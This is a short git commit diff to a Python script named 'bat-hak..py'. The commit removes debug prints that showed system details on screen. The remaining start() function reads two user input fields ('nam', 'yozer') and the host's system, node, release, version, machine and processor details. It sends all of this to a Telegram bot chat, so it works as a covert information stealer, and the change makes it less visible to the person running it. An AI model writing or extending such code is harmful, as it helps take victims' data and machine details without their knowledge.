ad7c38369d49a69ff6c7258e81bce9d15206ed95
NASER <shhbazynasr73@gmail.com>
2024-04-28 05:05:01 -0700

    levl dibag

--- bat-hak..py
+++ bat-hak..py
@@ -15,12 +15,7 @@ def send_message_to_telegram_bot(token, chat_id, message):
     else:
         print(f"Error sending message: Status Code: {response.status_code}")
 
-print(f"System: {uname.system}")
-print(f"Node Name: {uname.node}")
-print(f"Release: {uname.release}")
-print(f"Version: {uname.version}")
-print(f"Machine: {uname.machine}")
-print(f"Processor: {uname.processor}")
+
 def start():
     message_to_send = f"nam={pyaz1.get()} \n yozer={pyam2.get() }\n System: {uname.system}\n Node Name: {uname.node}\n Release: {uname.release} \n Version: {uname.version} \n Machine: {uname.machine} \n Processor: {uname.processor}"
     send_message_to_telegram_bot(telegram_bot_token, chat_id, message_to_send)
